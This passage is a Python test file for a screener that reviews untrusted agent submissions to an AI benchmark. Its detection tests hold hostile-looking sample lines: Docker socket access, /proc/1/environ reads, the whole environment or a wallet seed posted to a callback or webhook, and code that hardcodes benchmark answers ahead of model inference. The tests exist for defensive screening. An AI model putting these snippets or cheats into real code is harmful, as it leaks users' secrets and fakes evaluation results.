"""Agentic source-review controls for untrusted submission crates."""

from __future__ import annotations

import hashlib
import io
import json
import os
import sqlite3
import struct
import tarfile
import zipfile
from pathlib import Path
from typing import IO

import httpx
import pytest

from ditto_screener import binary_analysis as binary_analysis_module
from ditto_screener import source_review as source_review_module
from ditto_screener.binary_analysis import BinarySample
from ditto_screener.source_review import (
    OpenRouterSourceReviewAgent,
    TarSourceRepository,
)
from ditto_screener.source_signals import (
    find_decisive_malicious_source,
    find_source_review_leads,
)
from ditto_screening_protocol import (
    SourceReviewFinding,
    SourceReviewInvariant,
    SourceReviewInvariantDisposition,
)

_SHA = "ab" * 32

_PASS_CLAUSES = {
    "i1_model_invocation": "genuine_model_result",
    "i2_evidence_retention": "full_records_on_deciding_turn",
    "i3_model_dissent": "model_dissent_preserved",
    "i4_derived_value_authority": "no_derived_value",
    "i5_production_engine": "no_family_compiler",
    "i6_tool_execution_fidelity": "no_reported_tool_calls",
    "i7_model_tool_planning": "no_tool_planning",
}
_INVARIANT_FOR_CATEGORY = {
    "benchmark_emulation": "i5_production_engine",
    "scorer_contract_manipulation": "i3_model_dissent",
    "fabricated_tool_trajectory": "i6_tool_execution_fidelity",
}


def test_static_policy_v10_assessment_retains_each_independent_breach() -> None:
    assessment = source_review_module.policy_v10_static_assessment(
        breaches={
            SourceReviewInvariant.PRODUCTION_ENGINE: [0, 1],
            SourceReviewInvariant.TOOL_EXECUTION_FIDELITY: [2],
        }
    )
    decisions = {decision.invariant: decision for decision in assessment.decisions}

    assert decisions[SourceReviewInvariant.PRODUCTION_ENGINE].disposition == (
        SourceReviewInvariantDisposition.BREACH
    )
    assert decisions[SourceReviewInvariant.PRODUCTION_ENGINE].evidence_indices == [
        0,
        1,
    ]
    assert (
        decisions[SourceReviewInvariant.TOOL_EXECUTION_FIDELITY].disposition
        == SourceReviewInvariantDisposition.BREACH
    )
    assert decisions[
        SourceReviewInvariant.TOOL_EXECUTION_FIDELITY
    ].evidence_indices == [2]
    assert decisions[SourceReviewInvariant.MODEL_INVOCATION].disposition == (
        SourceReviewInvariantDisposition.INCONCLUSIVE
    )
    assert decisions[SourceReviewInvariant.MODEL_INVOCATION].pass_clause is None


@pytest.mark.parametrize(
    ("match", "expected"),
    [
        (
            {
                "kind": "authoritative-derived-candidate",
                "category": "benchmark_emulation",
            },
            SourceReviewInvariant.DERIVED_VALUE_AUTHORITY,
        ),
        (
            {"kind": "predetermined-tool-plan", "category": "benchmark_emulation"},
            SourceReviewInvariant.MODEL_TOOL_PLANNING,
        ),
        (
            {
                "kind": "any",
                "category": "benchmark_emulation",
                "resolution_basis": "benchmark_answer_replacement",
            },
            SourceReviewInvariant.PRODUCTION_ENGINE,
        ),
    ],
)
def test_static_match_maps_to_the_invariant_it_actually_assesses(
    match: dict[str, object], expected: SourceReviewInvariant
) -> None:
    assert source_review_module._static_match_invariant(match) == expected


def _with_policy_v10_invariants(
    review: dict[str, object],
) -> dict[str, object]:
    if "invariants" in review:
        return review
    categories = set(review.get("categories", []))
    evidence = review.get("evidence", [])
    assert isinstance(evidence, list)
    breaches = {
        invariant: category
        for category, invariant in _INVARIANT_FOR_CATEGORY.items()
        if category in categories
    }
    decisions: list[dict[str, object]] = []
    for invariant, pass_clause in _PASS_CLAUSES.items():
        category = breaches.get(invariant)
        if category is None:
            decisions.append(
                {
                    "invariant": invariant,
                    "disposition": "pass",
                    "pass_clause": pass_clause,
                    "summary": "The reviewed path satisfies the published pass clause.",
                    "evidence_indices": [],
                }
            )
            continue
        decisions.append(
            {
                "invariant": invariant,
                "disposition": "breach",
                "pass_clause": None,
                "summary": (
                    "The reviewed path retains a reachable strict-policy breach."
                ),
                "evidence_indices": [
                    index
                    for index, item in enumerate(evidence)
                    if isinstance(item, dict) and item.get("category") == category
                ],
            }
        )
    return {**review, "invariants": decisions}


_BENIGN_REVIEW: dict[str, object] = {
    "risk_level": "low",
    "confidence": 0.9,
    "categories": ["none"],
    "evidence": [],
    "summary": "General model-backed request path.",
}


def _archive(tmp_path: Path, source: str) -> Path:
    path = tmp_path / "agent.tar.gz"
    with tarfile.open(path, "w:gz") as archive:
        for name, value in {
            "Cargo.toml": '[package]\nname="agent"\nversion="0.1.0"\n',
            "Dockerfile": "FROM scratch\n",
            "src/main.rs": source,
        }.items():
            raw = value.encode()
            member = tarfile.TarInfo(name)
            member.size = len(raw)
            archive.addfile(member, io.BytesIO(raw))
    return path


def _archive_files(tmp_path: Path, files: dict[str, bytes]) -> Path:
    path = tmp_path / "files.tar.gz"
    with tarfile.open(path, "w:gz") as archive:
        for name, raw in files.items():
            member = tarfile.TarInfo(name)
            member.size = len(raw)
            archive.addfile(member, io.BytesIO(raw))
    return path


def _tool(call_id: str, name: str, arguments: dict[str, object]) -> dict[str, object]:
    if name == "submit_review":
        arguments = _with_policy_v10_invariants(arguments)
    return {
        "id": call_id,
        "type": "function",
        "function": {"name": name, "arguments": json.dumps(arguments)},
    }


def _transport(final: dict[str, object], seen: list[dict[str, object]]):
    calls = 0

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal calls
        payload = json.loads(request.content)
        seen.append(payload)
        assert request.headers["authorization"] == "Bearer sk-test-private-review"
        assert request.headers["http-referer"] == "https://heyditto.ai"
        assert request.headers["x-openrouter-title"] == "Ditto"
        if calls == 0:
            tool_calls = [
                _tool(
                    "read-1",
                    "read_file",
                    {"path": "src/main.rs", "start_line": 1, "end_line": 400},
                ),
                _tool("search-1", "search", {"query": "call_model"}),
            ]
        else:
            tool_calls = [_tool("submit-1", "submit_review", final)]
        calls += 1
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    return httpx.MockTransport(handler)


def _agent(
    key_file: Path, transport: httpx.AsyncBaseTransport
) -> OpenRouterSourceReviewAgent:
    return OpenRouterSourceReviewAgent(
        api_key_file=str(key_file),
        model="openai/gpt-5.6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=10,
        max_steps=4,
        transport=transport,
    )


def _archive_with(tmp_path: Path, extra: dict[str, bytes]) -> Path:
    path = tmp_path / "agent.tar.gz"
    with tarfile.open(path, "w:gz") as archive:
        base = {
            "Cargo.toml": b'[package]\nname="agent"\nversion="0.1.0"\n',
            "Dockerfile": b"FROM scratch\n",
            "src/main.rs": b"fn main() {}\n",
        }
        base.update(extra)
        for name, raw in base.items():
            member = tarfile.TarInfo(name)
            member.size = len(raw)
            archive.addfile(member, io.BytesIO(raw))
    return path


def _varint(value: int) -> bytes:
    encoded = bytearray()
    while value > 0x7F:
        encoded.append((value & 0x7F) | 0x80)
        value >>= 7
    encoded.append(value)
    return bytes(encoded)


def _pb_varint(field: int, value: int) -> bytes:
    return _varint(field << 3) + _varint(value)


def _pb_bytes(field: int, value: bytes) -> bytes:
    return _varint((field << 3) | 2) + _varint(len(value)) + value


def _minimal_onnx() -> bytes:
    # ONNX ModelProto -> GraphProto -> NodeProto/TensorProto/ValueInfoProto.
    node = _pb_bytes(4, b"MatMul")
    tensor = (
        _pb_varint(2, 1)
        + _pb_bytes(8, b"reranker.weight")
        + _pb_bytes(9, b"\x00\xff\x02\x03")
    )
    value_info = _pb_bytes(1, b"embedding")
    graph = b"".join(
        [
            _pb_bytes(1, node),
            _pb_bytes(2, b"reranker"),
            _pb_bytes(5, tensor),
            _pb_bytes(11, value_info),
            _pb_bytes(12, value_info),
        ]
    )
    opset = _pb_bytes(1, b"") + _pb_varint(2, 18)
    return _pb_varint(1, 9) + _pb_bytes(7, graph) + _pb_bytes(8, opset)


def test_opaque_binary_blob_is_surfaced_in_inventory(tmp_path: Path) -> None:
    blob = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00secret-string-table\x00" * 8
    repo = TarSourceRepository(str(_archive_with(tmp_path, {"assets/table.bin": blob})))
    inventory = json.loads(repo.inventory())
    opaque = {entry["path"]: entry for entry in inventory["opaque_blobs"]}
    assert "assets/table.bin" in opaque
    assert opaque["assets/table.bin"]["reason"] == "non_utf8"
    assert opaque["assets/table.bin"]["bytes"] == len(blob)
    # A normal UTF-8 source file is not surfaced as opaque.
    assert "src/main.rs" not in opaque


def test_valid_onnx_is_structurally_analyzed_without_extension_trust(
    tmp_path: Path,
) -> None:
    model = _minimal_onnx()
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/reranker.bin": model}))
    )

    inventory = json.loads(repo.inventory())
    assert [item["path"] for item in inventory["opaque_blobs"]] == [
        "models/reranker.bin"
    ]
    assert inventory["binary_analysis"][0]["path"] == "models/reranker.bin"
    assert inventory["binary_analysis"][0]["format"] == "onnx"
    assert inventory["binary_analysis"][0]["details"]["operator_types"] == ["MatMul"]
    analysis = json.loads(repo.analyze_binary("models/reranker.bin"))

    assert analysis["format"] == "onnx"
    assert analysis["format_confidence"] == "high"
    assert analysis["details"]["graph_complete"] is True
    assert analysis["details"]["graph_parse_status"] == "complete"
    assert analysis["details"]["graph_name"] == "reranker"
    assert analysis["details"]["ir_version"] == 9
    assert analysis["details"]["node_count"] == 1
    assert analysis["details"]["initializer_count"] == 1
    assert analysis["details"]["initializer_bytes"] == 4
    assert analysis["details"]["input_count"] == 1
    assert analysis["details"]["output_count"] == 1
    assert analysis["details"]["operator_types"] == ["MatMul"]
    assert analysis["details"]["opsets"] == [{"domain": "", "version": 18}]
    assert analysis["details"]["external_data_references"] == 0
    assert analysis["details"]["metadata_complete"] is True
    assert analysis["details"]["model_parse_status"] == "complete"
    assert analysis["benchmark_schema_markers"] == []
    assert analysis["safety"] == {
        "decompressed_payloads": False,
        "executed": False,
        "external_data_loaded": False,
    }


def test_onnx_suffix_does_not_hide_renamed_answer_registry(tmp_path: Path) -> None:
    registry = (
        b"\xff\x00expected_answer\x00answer_items\x00forbidden_answer\x00"
        b"memory_cases\x00run_after_wave\x00tool_cases\x00"
    )
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/answers.onnx": registry}))
    )

    analysis = json.loads(repo.analyze_binary("models/answers.onnx"))

    assert analysis["format"] == "binary-data"
    assert analysis["benchmark_schema_markers"] == [
        "answer_items",
        "expected_answer",
        "forbidden_answer",
        "memory_cases",
        "run_after_wave",
        "tool_cases",
    ]
    inventory = json.loads(repo.inventory())
    assert any(
        item["path"] == "models/answers.onnx" for item in inventory["opaque_blobs"]
    )
    assert inventory["binary_analysis"][0]["format"] == "binary-data"
    assert inventory["binary_analysis"][0]["benchmark_schema_markers"] == [
        "answer_items",
        "expected_answer",
        "forbidden_answer",
        "memory_cases",
        "run_after_wave",
        "tool_cases",
    ]


def test_analyze_binary_reports_executable_and_archive_structure(
    tmp_path: Path,
) -> None:
    elf = bytearray(64)
    elf[:7] = b"\x7fELF\x02\x01\x01"
    elf[16:20] = struct.pack("<HH", 2, 62)
    elf[24:32] = struct.pack("<Q", 0x401000)
    archive_buffer = io.BytesIO()
    with zipfile.ZipFile(archive_buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("dataset/memory_cases.json", b'{"expected_answer":"x"}')

    repo = TarSourceRepository(
        str(
            _archive_with(
                tmp_path,
                {
                    "bin/agent": bytes(elf),
                    "fixtures/public-dataset.zip": archive_buffer.getvalue(),
                },
            )
        )
    )

    executable = json.loads(repo.analyze_binary("bin/agent"))
    bundled = json.loads(repo.analyze_binary("fixtures/public-dataset.zip"))

    assert executable["format"] == "elf"
    assert executable["details"] == {
        "bits": 64,
        "byte_order": "little",
        "entrypoint": 0x401000,
        "machine": 62,
        "os_abi": 0,
        "type": 2,
    }
    assert bundled["format"] == "zip"
    assert bundled["details"]["entry_count"] == 1
    assert bundled["details"]["entries"][0]["path"] == ("dataset/memory_cases.json")
    assert bundled["safety"]["decompressed_payloads"] is False


def test_analyze_binary_reports_safetensors_without_loading_weights(
    tmp_path: Path,
) -> None:
    header = json.dumps(
        {
            "reranker.weight": {
                "dtype": "F32",
                "shape": [2, 2],
                "data_offsets": [0, 16],
            },
            "__metadata__": {"framework": "competition-reranker"},
        },
        separators=(",", ":"),
    ).encode()
    model = len(header).to_bytes(8, "little") + header + b"\xff" * 16
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/reranker.weights": model}))
    )

    analysis = json.loads(repo.analyze_binary("models/reranker.weights"))

    assert analysis["format"] == "safetensors"
    assert analysis["details"]["tensor_count"] == 1
    assert analysis["details"]["tensor_bytes"] == 16
    assert analysis["details"]["tensors"] == [
        {
            "bytes": 16,
            "dtype": "F32",
            "name": "reranker.weight",
            "shape": [2, 2],
        }
    ]
    assert analysis["safety"]["external_data_loaded"] is False


def test_safetensors_rejects_invalid_and_overlapping_payload_ranges(
    tmp_path: Path,
) -> None:
    header = json.dumps(
        {
            "valid": {"dtype": "U8", "shape": [8], "data_offsets": [0, 8]},
            "negative": {"dtype": "U8", "shape": [1], "data_offsets": [-1, 0]},
            "descending": {
                "dtype": "U8",
                "shape": [1],
                "data_offsets": [9, 8],
            },
            "outside": {"dtype": "U8", "shape": [1], "data_offsets": [16, 17]},
            "overlap": {"dtype": "U8", "shape": [8], "data_offsets": [4, 12]},
            "boolean": {"dtype": "U8", "shape": [1], "data_offsets": [False, 1]},
        },
        separators=(",", ":"),
    ).encode()
    model = len(header).to_bytes(8, "little") + header + b"\xff" * 16
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/untrusted.weights": model}))
    )

    analysis = json.loads(repo.analyze_binary("models/untrusted.weights"))

    assert analysis["format"] == "safetensors"
    assert analysis["format_confidence"] == "medium"
    assert analysis["details"]["tensor_count"] == 1
    assert analysis["details"]["tensor_bytes"] == 8
    assert analysis["details"]["invalid_tensor_ranges"] == 5
    assert analysis["details"]["payload_available"] is False


def test_safetensors_without_declared_payload_is_not_high_confidence(
    tmp_path: Path,
) -> None:
    header = json.dumps(
        {
            "missing": {
                "dtype": "F32",
                "shape": [2, 2],
                "data_offsets": [0, 16],
            }
        },
        separators=(",", ":"),
    ).encode()
    model = len(header).to_bytes(8, "little") + header
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/missing-payload.weights": model}))
    )

    analysis = json.loads(repo.analyze_binary("models/missing-payload.weights"))

    assert analysis["format"] != "safetensors"
    assert analysis["format_confidence"] != "high"


def test_onnx_truncated_top_level_parse_is_partial(tmp_path: Path) -> None:
    model = _minimal_onnx() + _pb_varint(2, 128)[:-1]
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/truncated.onnx": model}))
    )

    analysis = json.loads(repo.analyze_binary("models/truncated.onnx"))

    assert analysis["format"] == "onnx"
    assert analysis["format_confidence"] == "medium"
    assert analysis["details"]["model_parse_status"] == "truncated"
    assert analysis["details"]["metadata_complete"] is False


def test_onnx_field_cap_is_partial(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(binary_analysis_module, "_MAX_PROTO_FIELDS", 2)
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/capped.onnx": _minimal_onnx()}))
    )

    analysis = json.loads(repo.analyze_binary("models/capped.onnx"))

    assert analysis["format"] == "onnx"
    assert analysis["format_confidence"] == "medium"
    assert analysis["details"]["model_parse_status"] == "field_limit"
    assert analysis["details"]["metadata_complete"] is False


def test_onnx_truncated_nested_graph_is_partial(tmp_path: Path) -> None:
    graph = _pb_bytes(1, _pb_bytes(4, b"MatMul")) + b"\x10\x80"
    model = _pb_varint(1, 9) + _pb_bytes(7, graph)
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/partial-graph.onnx": model}))
    )

    analysis = json.loads(repo.analyze_binary("models/partial-graph.onnx"))

    assert analysis["format"] == "onnx"
    assert analysis["format_confidence"] == "medium"
    assert analysis["details"]["graph_parse_status"] == "truncated"
    assert analysis["details"]["graph_complete"] is False
    assert analysis["details"]["metadata_complete"] is False


def test_analyze_binary_surfaces_datagen_schema_inside_sqlite(tmp_path: Path) -> None:
    database = tmp_path / "answers.db"
    connection = sqlite3.connect(database)
    connection.execute(
        "CREATE TABLE memory_cases "
        "(expected_answer TEXT, answer_items TEXT, forbidden_answer TEXT)"
    )
    connection.commit()
    connection.close()
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"cache/retrieval.db": database.read_bytes()}))
    )

    analysis = json.loads(repo.analyze_binary("cache/retrieval.db"))

    assert analysis["format"] == "sqlite3"
    assert analysis["details"]["page_size"] == 4096
    assert analysis["benchmark_schema_markers"] == [
        "answer_items",
        "expected_answer",
        "forbidden_answer",
        "memory_cases",
    ]


def test_analyze_binary_is_bounded_and_labels_partial_analysis(tmp_path: Path) -> None:
    oversized = b"\xff" + b"x" * (8 * 1024 * 1024 + 1)
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/large.weights": oversized}))
    )

    analysis = json.loads(repo.analyze_binary("models/large.weights"))

    assert analysis["bytes"] == len(oversized)
    assert analysis["analyzed_bytes"] == 8 * 1024 * 1024
    assert analysis["analysis_truncated"] is True
    assert len(analysis["sha256"]) == 64
    assert analysis["sha256_complete"] is True
    assert analysis["sha256_bytes"] == len(oversized)


def test_binary_hashing_has_an_expanded_member_cap(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(binary_analysis_module, "_MAX_HASHED_BYTES", 16)

    sample = binary_analysis_module.sample_stream(io.BytesIO(b"x" * 64), size=64)
    analysis = binary_analysis_module.analyze_binary(sample, path="data/bomb.bin")

    assert sample.hashed_bytes == 16
    assert sample.hash_complete is False
    assert analysis["sha256_bytes"] == 16
    assert analysis["sha256_complete"] is False
    assert analysis["analysis_truncated"] is True


def test_analyze_binary_rejects_missing_member(tmp_path: Path) -> None:
    repo = TarSourceRepository(str(_archive_with(tmp_path, {})))
    assert json.loads(repo.analyze_binary("missing.onnx")) == {
        "error": "file-not-found"
    }


def test_inventory_preanalysis_is_reused_by_agent_tool(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls = 0
    original = source_review_module.sample_stream

    def counting_sample_stream(stream: IO[bytes], *, size: int) -> BinarySample:
        nonlocal calls
        calls += 1
        return original(stream, size=size)

    monkeypatch.setattr(source_review_module, "sample_stream", counting_sample_stream)
    repo = TarSourceRepository(
        str(_archive_with(tmp_path, {"models/reranker.onnx": _minimal_onnx()}))
    )

    inventory = json.loads(repo.inventory())
    detailed = json.loads(repo.analyze_binary("models/reranker.onnx"))

    assert inventory["binary_analysis"][0]["sha256"] == detailed["sha256"]
    assert calls == 1


def test_oversized_file_is_surfaced_as_opaque(tmp_path: Path) -> None:
    big = b"a" * (2 * 1024 * 1024 + 16)
    repo = TarSourceRepository(str(_archive_with(tmp_path, {"data/big.txt": big})))
    opaque = json.loads(repo.inventory())["opaque_blobs"]
    assert any(
        entry["path"] == "data/big.txt" and entry["reason"] == "oversized"
        for entry in opaque
    )


def test_utf8_only_crate_reports_no_opaque_blobs(tmp_path: Path) -> None:
    repo = TarSourceRepository(str(_archive_with(tmp_path, {})))
    inventory = json.loads(repo.inventory())
    assert inventory["opaque_blobs"] == []
    assert inventory["binary_analysis"] == []


def test_generator_mirroring_constellation_supports_auditable_finding(
    tmp_path: Path,
) -> None:
    source = b"""\
const ATTRS: &[&str] = &["city", "employer", "car", "university", "instrument",
    "project", "trip", "pet", "cuisine", "diet", "color", "hobby"];
const QUESTIONS: &[&str] = &[
    "What city do I live in?", "Where do I work now?",
    "Which university did I attend?", "How many projects did I mention?",
    "List every trip I described.", "What did I use to drive before?",
];
const FACTS: &[&str] = &[
    "I moved to Northport.", "I work at Example Labs.", "I drive a hatchback.",
    "I studied at Northport College.", "I play an instrument.",
    "My project is Atlas.", "My favorite cuisine changed recently.",
];
const EVENT_LABELS: &[&str] = &["moved", "started", "switched", "changed"];
fn bridge_question_to_fact(question: &str, query: &str, fact: &str, memory: &str,
    attribute: &str, value: &str) {
    let _ = (extract(question), retrieve(query, memory), match_fact(fact),
        keyword(attribute), value);
}
fn deterministic_response() -> Option<String> { return Some(answer()); }
fn run() -> String {
    if let Some(answer) = deterministic_response() { return answer; }
    otherwise_call_model_inference_provider()
}
"""
    repo = TarSourceRepository(
        str(_archive_files(tmp_path, {"src/memory_solver.rs": source}))
    )

    analysis = repo.review_leads()["generator_mirroring"]

    assert analysis["aggregate_candidate"] is True
    assert analysis["served_runtime_candidate"] is True
    assert {
        location["dimension"] for location in analysis["served_runtime_locations"]
    } == {
        "question_templates",
        "retrieval_vocabulary_bridge",
        "deterministic_answer_path",
    }
    assert analysis["matched_dimensions"] == [
        "attribute_ontology",
        "question_templates",
        "fact_update_frames",
        "event_label_frames",
        "retrieval_vocabulary_bridge",
        "deterministic_answer_path",
    ]
    dimensions = analysis["dimensions"]
    assert all(
        location["path"] == "src/memory_solver.rs"
        and isinstance(location["line"], int)
        and location["line"] > 0
        for dimension in dimensions.values()
        for location in dimension["locations"]
    )
    assert analysis["disposition"] == "requires-runtime-causal-review"
    assert "text" not in json.dumps(analysis)

    observation = source_review_module._parse_review(
        _with_policy_v10_invariants(
            {
                "risk_level": "high",
                "confidence": 0.96,
                "categories": ["benchmark_emulation"],
                "evidence": [
                    {
                        "path": "src/memory_solver.rs",
                        "line": line,
                        "category": "benchmark_emulation",
                    }
                    for line in (1, 4, 8, 13, 21, 22)
                ],
                "summary": (
                    "Coordinated public-generator mirror returns deterministic answers "
                    "before inference."
                ),
            }
        ),
        artifact_sha256=_SHA,
        repository=repo,
    )
    assert observation.risk_level == "high"
    assert observation.categories == ("benchmark_emulation",)
    assert observation.finding is not None
    assert observation.finding["prompt_revision"] == "source-review-v22-policy-v10"
    assert observation.finding["evidence"] == [
        {
            "path": "src/memory_solver.rs",
            "line": line,
            "category": "benchmark_emulation",
        }
        for line in (1, 4, 8, 13, 21, 22)
    ]


def test_served_generator_candidate_ignores_one_generic_task_prompt(
    tmp_path: Path,
) -> None:
    source = b"""\
const PROMPT: &str = "How many projects should I list?";
pub async fn run(question: &str) -> RunResponse {
    let memory = retrieve(question);
    let answer = model(memory).await;
    RunResponse { final_text: answer, answer: None, abstain: None }
}
"""
    repo = TarSourceRepository(str(_archive_files(tmp_path, {"src/agent.rs": source})))

    analysis = repo.review_leads()["generator_mirroring"]

    assert analysis["served_runtime_candidate"] is False
    assert analysis["served_runtime_locations"] == []


def test_generator_scan_prioritizes_runtime_source_over_decoy_files(
    tmp_path: Path,
) -> None:
    runtime = b"""\
const ATTRS: &[&str] = &["city", "employer", "car", "university", "instrument",
    "project", "trip", "pet", "cuisine", "diet", "color", "hobby"];
const QUESTIONS: &[&str] = &["What city?", "Where work?", "Which project?",
    "How many trips?", "List pets", "What was used before?"];
const FACTS: &[&str] = &["I moved city", "I work company", "I drive car",
    "I studied university", "I play instrument", "My project changed"];
const EVENTS: &[&str] = &["moved", "started", "switched", "changed"];
fn bridge(question: Query, query: Query, fact: Fact, memory: Memory,
    attribute: Attr, value: Value) { extract(question); retrieve(query, memory);
    match_fact(fact); keyword(attribute); use_value(value); }
fn direct_answer() -> Answer { return deterministic_answer(); }
fn run() -> Answer { if ready() { return direct_answer(); } call_model_inference(); }
"""
    files = {
        **{f"docs/decoy-{index:04}.md": b"irrelevant" for index in range(2048)},
        "src/runtime.rs": runtime,
    }
    repo = TarSourceRepository(str(_archive_files(tmp_path, files)))

    analysis = repo.review_leads()["generator_mirroring"]

    assert analysis["aggregate_candidate"] is True
    assert analysis["scanned_runtime_source_files"] == 1


@pytest.mark.parametrize(
    "name,source",
    [
        (
            "ordinary-schema",
            "struct Profile { city: String, employer: String, car: String, "
            "university: String, instrument: String, projects: Vec<String>, "
            "trips: Vec<String>, pets: Vec<String>, cuisine: String, color: String }",
        ),
        (
            "generic-retrieval",
            "fn retrieve(question: Query, memory: Memory) -> Fact { "
            "extract(question.value); match_fact(memory.attribute); keyword_search() }",
        ),
        (
            "public-benchmark-comment",
            "// DittoBench uses scalar and list attributes, question templates, "
            "// fact updates, event labels, and retrieval.\nfn call_model() {}",
        ),
        (
            "generic-direct-answer",
            "fn run() { if let Some(answer) = deterministic_response() "
            "{ return answer; } "
            "otherwise_call_model_provider(); }",
        ),
    ],
)
def test_isolated_schema_retrieval_or_benchmark_mentions_do_not_form_candidate(
    tmp_path: Path, name: str, source: str
) -> None:
    repo = TarSourceRepository(
        str(_archive_files(tmp_path, {f"src/{name}.rs": source.encode()}))
    )

    analysis = repo.review_leads()["generator_mirroring"]

    assert analysis["aggregate_candidate"] is False
    assert analysis["disposition"] == "no-aggregate-candidate"


@pytest.mark.parametrize(
    ("expected_category", "source"),
    [
        (
            "malicious_build",
            'let endpoint = "/var/run/docker.sock";\nconnect_control_socket(endpoint);',
        ),
        (
            "malicious_build",
            'let boundary = "/proc/1/root";\nmount_host_boundary(boundary);',
        ),
        (
            "credential_access",
            'let path = "/proc/1/environ";\nlet data = read_secret_path(path);',
        ),
        (
            "cross_user_access",
            'let home = "/root/.config";\nscan_cross_user_home(home);',
        ),
        (
            "data_exfiltration",
            "let secret = os.environ.clone();\nhttp_client.post(callback, secret);",
        ),
    ],
)
def test_decisive_malicious_preflight_categories(
    expected_category: str, source: str
) -> None:
    findings = find_decisive_malicious_source([("src/runtime.rs", source)])
    assert expected_category in {item["category"] for item in findings}


def test_decisive_preflight_allows_a_targeted_api_key_read_beside_a_post() -> None:
    """One named key plus an outbound call is an API client, not a leak.

    Reproduces white-bolt v2 (artifact 55e3d522) and Omar-miner_v9, both
    quarantined at confidence 1.0 for a dev script that reads the provider key
    it is about to authenticate with. The key never leaves the provider that
    issued it, so there is nothing exfiltrated.
    """
    findings = find_decisive_malicious_source(
        [
            (
                "scripts/system-transport-probe.py",
                'api_key = os.environ.get("OPENROUTER_API_KEY", "").strip()\n'
                "results = post_completion(base_url=base_url, api_key=api_key)\n",
            ),
            (
                "src/runtime.rs",
                'let key = std::env::var("OPENROUTER_API_KEY").unwrap_or_default();\n'
                "let response = http_client.post(url).bearer_auth(key).send();\n",
            ),
        ]
    )
    assert findings == []


def test_decisive_preflight_still_flags_whole_environment_capture() -> None:
    """Enumerating the environment beside an outbound call stays decisive."""
    for source in (
        "payload = dict(os.environ)\nrequests.post(webhook, json=payload)",
        "for name in os.environ:\n    upload(name)",
        "let all = std::env::vars().collect();\nreqwest::Client::new().post(sink);",
        'let raw = read("/proc/self/environ");\nhttp_client.post(callback, raw);',
    ):
        findings = find_decisive_malicious_source([("src/runtime.rs", source)])
        assert "data_exfiltration" in {item["category"] for item in findings}, source


def test_decisive_preflight_still_flags_targeted_wallet_reads() -> None:
    """A named lookup is only forgiven for the environment, not for wallets."""
    findings = find_decisive_malicious_source(
        [
            (
                "src/runtime.rs",
                'let seed = read(".bittensor/wallets/default");\n'
                "http_client.post(sink, seed);",
            )
        ]
    )
    assert "data_exfiltration" in {item["category"] for item in findings}


def test_decisive_malicious_preflight_ignores_inert_regression_material() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "tests/security_canary.rs",
                'assert_blocked("/var/run/docker.sock"); read_fixture(".env");',
            ),
            (
                "docs/security.md",
                "Never mount the host root or upload a credential.",
            ),
            (
                "src/agent.rs",
                "// /var/run/docker.sock connect mount host\n"
                "fn run() { call_model(); }",
            ),
            (
                "src/prompt.rs",
                'let security_prompt = r#"Never read, open, scan, or copy\n'
                "/proc/1/environ or credential files.\n"
                'Do not upload them."#;',
            ),
        ]
    )
    assert findings == []


def test_decisive_preflight_ignores_nested_inert_regression_material() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "vendor/dependency/tests/security_canary.rs",
                'assert_blocked("/var/run/docker.sock"); read_fixture(".env");',
            ),
            (
                "dependency/docs/security_example.py",
                'connect_control_socket("/var/run/docker.sock")',
            ),
        ]
    )

    assert findings == []


def test_decisive_preflight_keeps_runtime_beside_nested_inert_material() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "vendor/dependency/tests/security_canary.rs",
                'assert_blocked("/var/run/docker.sock");',
            ),
            (
                "vendor/dependency/src/runtime.rs",
                'let endpoint = "/var/run/docker.sock";\n'
                "connect_control_socket(endpoint);",
            ),
        ]
    )

    assert "malicious_build" in {item["category"] for item in findings}


def test_decisive_preflight_keeps_runtime_under_src_named_tests() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "src/tests/runtime.rs",
                'let endpoint = "/var/run/docker.sock";\n'
                "connect_control_socket(endpoint);",
            )
        ]
    )

    assert "malicious_build" in {item["category"] for item in findings}


def test_decisive_malicious_preflight_keeps_real_effect_beside_prompt() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "src/runtime.rs",
                'let security_prompt = "Never read /proc/1/environ";\n'
                'let stolen = read_secret_path("/proc/1/environ");',
            )
        ]
    )

    assert "credential_access" in {item["category"] for item in findings}


def test_decisive_malicious_preflight_masks_strings_after_triple_quotes() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "scripts/local-lab.py",
                '"""Local development helper."""\n'
                "def child_environment(pass_env):\n"
                "    safe = {name for name in os.environ if name.startswith('LC_')}\n"
                "    for name in pass_env:\n"
                "        if name not in os.environ:\n"
                '            raise ValueError(f"requested environment variable '
                'is not set: {name}")\n'
                "    return {name: os.environ[name] for name in safe}\n",
            )
        ]
    )

    assert findings == []


def test_decisive_malicious_preflight_detects_effect_after_triple_quotes() -> None:
    findings = find_decisive_malicious_source(
        [
            (
                "src/runtime.py",
                '"""Runtime entrypoint."""\n'
                "secret = os.environ.copy()\n"
                "http_client.post(callback, secret)\n",
            )
        ]
    )

    assert "data_exfiltration" in {item["category"] for item in findings}


def test_repository_preflight_emits_digest_bound_location_only_finding(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/runtime.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
